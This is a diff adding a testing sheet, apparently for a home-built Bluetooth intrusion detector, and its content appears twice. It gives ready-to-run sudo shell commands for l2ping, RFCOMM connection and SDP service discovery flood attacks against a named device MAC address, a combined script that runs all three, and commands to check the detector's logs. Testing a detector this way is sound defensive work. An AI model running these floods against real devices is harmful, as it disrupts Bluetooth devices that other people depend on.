@@ -1,0 +1,245 @@
+================================================================================
+🎯 BLUETOOTH ATTACK COMMANDS - MODULE 4 TESTING
+================================================================================
+
+Dashboard: http://localhost:8000/module4
+Target: DESKTOP-HFJQU5V (28:C6:3F:91:67:CE)
+
+================================================================================
+📋 ATTACK 1: L2PING FLOOD
+================================================================================
+
+cd "/home/floki/Downloads/OWN R/Complete Project (2)/Complete Project/Attack Scripts and Commands/Bluetooth Attacks" && sudo python3 Blueson_quick.py
+
+✅ Status: TESTED - WORKING
+⏱️  Duration: 20 seconds
+🔴 Severity: HIGH
+📊 Detection: Creates 5 l2ping processes
+
+================================================================================
+📋 ATTACK 2: RFCOMM CONNECTION FLOOD
+================================================================================
+
+sudo bash -c 'TARGET="28:C6:3F:91:67:CE"; for i in {1..5}; do timeout 20 rfcomm connect 0 $TARGET $i &>/dev/null & done; echo "✅ RFCOMM flood launched (20 seconds)"; sleep 20; pkill -9 rfcomm; echo "✅ Completed"'
+
+🟠 Status: NEW - READY TO TEST
+⏱️  Duration: 20 seconds
+🟠 Severity: HIGH
+📊 Detection: Creates multiple rfcomm processes
+
+================================================================================
+📋 ATTACK 3: SDP SERVICE DISCOVERY FLOOD
+================================================================================
+
+sudo bash -c 'TARGET="28:C6:3F:91:67:CE"; for i in {1..5}; do timeout 20 sdptool browse $TARGET &>/dev/null & done; echo "✅ SDP flood launched (20 seconds)"; sleep 20; pkill -9 sdptool; echo "✅ Completed"'
+
+🟡 Status: NEW - READY TO TEST
+⏱️  Duration: 20 seconds
+🟡 Severity: MEDIUM
+📊 Detection: Creates multiple sdptool processes
+
+================================================================================
+⚡ RUN ALL 3 ATTACKS SEQUENTIALLY
+================================================================================
+
+sudo bash -c '
+TARGET="28:C6:3F:91:67:CE"
+
+echo "=========================================="
+echo "🔴 ATTACK 1/3: L2PING FLOOD"
+echo "=========================================="
+for i in {1..5}; do timeout 15 l2ping -i hci0 -s 600 -f $TARGET &>/dev/null & done
+sleep 15
+pkill -9 l2ping
+echo "✅ L2PING completed"
+sleep 5
+
+echo ""
+echo "=========================================="
+echo "🟠 ATTACK 2/3: RFCOMM FLOOD"  
+echo "=========================================="
+for i in {1..5}; do timeout 15 rfcomm connect 0 $TARGET $i &>/dev/null & done
+sleep 15
+pkill -9 rfcomm
+echo "✅ RFCOMM completed"
+sleep 5
+
+echo ""
+echo "=========================================="
+echo "🟡 ATTACK 3/3: SDP FLOOD"
+echo "=========================================="
+for i in {1..5}; do timeout 15 sdptool browse $TARGET &>/dev/null & done
+sleep 15
+pkill -9 sdptool
+echo "✅ SDP completed"
+
+echo ""
+echo "=========================================="
+echo "✅ ALL ATTACKS COMPLETED!"
+echo "=========================================="
+echo "📱 Check: http://localhost:8000/module4"
+'
+
+⏱️  Total Duration: ~60 seconds
+📊 Tests: All 3 attack types
+
+================================================================================
+🔍 VERIFY DETECTION
+================================================================================
+
+Check JSON File:
+cat "/home/floki/Downloads/OWN R/Complete Project (2)/Complete Project/Module 1 - Bluetooth & Wi-Fi Discovery Scanner/backend/realtime_bluetooth_attacks.json" | python3 -m json.tool
+
+Check Detector Logs:
+tail -30 "/home/floki/Downloads/OWN R/Complete Project (2)/Complete Project/Module 1 - Bluetooth & Wi-Fi Discovery Scanner/backend/detector.log"
+
+Check Dashboard:
+Open: http://localhost:8000/module4
+
+================================================================================
+📝 NOTES
+================================================================================
+
+• All commands require sudo (root permissions)
+• Attacks run for 15-20 seconds each
+• Module 4 displays attacks for 20 seconds
+• Attacks move to history after 20 seconds
+• Attacks cleared from JSON after 60 seconds
+• Dashboard auto-refreshes every 5 seconds
+
+================================================================================
+
+
+
+
+
+
+
+
+
+
+
+
+🎯 BLUETOOTH ATTACK COMMANDS - MODULE 4 TESTING
+================================================================================
+
+Dashboard: http://localhost:8000/module4
+Target: DESKTOP-HFJQU5V (28:C6:3F:91:67:CE)
+
+================================================================================
+📋 ATTACK 1: L2PING FLOOD
+================================================================================
+
+cd "/home/floki/Downloads/OWN R/Complete Project (2)/Complete Project/Attack Scripts and Commands/Bluetooth Attacks" && sudo python3 Blueson_quick.py
+
+✅ Status: TESTED - WORKING
+⏱️  Duration: 20 seconds
+🔴 Severity: HIGH
+📊 Detection: Creates 5 l2ping processes
+
+================================================================================
+📋 ATTACK 2: RFCOMM CONNECTION FLOOD
+================================================================================
+
+sudo bash -c 'TARGET="28:C6:3F:91:67:CE"; for i in {1..5}; do timeout 20 rfcomm connect 0 $TARGET $i &>/dev/null & done; echo "✅ RFCOMM flood launched (20 seconds)"; sleep 20; pkill -9 rfcomm; echo "✅ Completed"'
+
+🟠 Status: NEW - READY TO TEST
+⏱️  Duration: 20 seconds
+🟠 Severity: HIGH
+📊 Detection: Creates multiple rfcomm processes
+
+================================================================================
+📋 ATTACK 3: SDP SERVICE DISCOVERY FLOOD
+================================================================================
+
+sudo bash -c 'TARGET="28:C6:3F:91:67:CE"; for i in {1..5}; do timeout 20 sdptool browse $TARGET &>/dev/null & done; echo "✅ SDP flood launched (20 seconds)"; sleep 20; pkill -9 sdptool; echo "✅ Completed"'
+
+🟡 Status: NEW - READY TO TEST
+⏱️  Duration: 20 seconds
+🟡 Severity: MEDIUM
+📊 Detection: Creates multiple sdptool processes
+
+================================================================================
+⚡ RUN ALL 3 ATTACKS SEQUENTIALLY
+================================================================================
+
+sudo bash -c '
+TARGET="28:C6:3F:91:67:CE"
+
+echo "=========================================="
+echo "🔴 ATTACK 1/3: L2PING FLOOD"
+echo "=========================================="
+for i in {1..5}; do timeout 15 l2ping -i hci0 -s 600 -f $TARGET &>/dev/null & done
+sleep 15
+pkill -9 l2ping
+echo "✅ L2PING completed"
+sleep 5
+
+echo ""
+echo "=========================================="
+echo "🟠 ATTACK 2/3: RFCOMM FLOOD"  
+echo "=========================================="
+for i in {1..5}; do timeout 15 rfcomm connect 0 $TARGET $i &>/dev/null & done
+sleep 15
+pkill -9 rfcomm
+echo "✅ RFCOMM completed"
+sleep 5
+
+echo ""
+echo "=========================================="
+echo "🟡 ATTACK 3/3: SDP FLOOD"
+echo "=========================================="
+for i in {1..5}; do timeout 15 sdptool browse $TARGET &>/dev/null & done
+sleep 15
+pkill -9 sdptool
+echo "✅ SDP completed"
+
+echo ""
+echo "=========================================="
+echo "✅ ALL ATTACKS COMPLETED!"
+echo "=========================================="
+echo "📱 Check: http://localhost:8000/module4"
+'
+
+⏱️  Total Duration: ~60 seconds
+📊 Tests: All 3 attack types
+
+================================================================================
+🔍 VERIFY DETECTION
+================================================================================
+
+Check JSON File:
+cat "/home/floki/Downloads/OWN R/Complete Project (2)/Complete Project/Module 1 - Bluetooth & Wi-Fi Discovery Scanner/backend/realtime_bluetooth_attacks.json" | python3 -m json.tool
+
+Check Detector Logs:
+tail -30 "/home/floki/Downloads/OWN R/Complete Project (2)/Complete Project/Module 1 - Bluetooth & Wi-Fi Discovery Scanner/backend/detector.log"
+
+Check Dashboard:
+Open: http://localhost:8000/module4
+
+================================================================================
+📝 NOTES
+================================================================================
+
+• All commands require sudo (root permissions)
+• Attacks run for 15-20 seconds each
+• Module 4 displays attacks for 20 seconds
+• Attacks move to history after 20 seconds
+• Attacks cleared from JSON after 60 seconds
+• Dashboard auto-refreshes every 5 seconds
+
+================================================================================
+
+
+
+
+
+
+
+
+
+
+
+
+
+
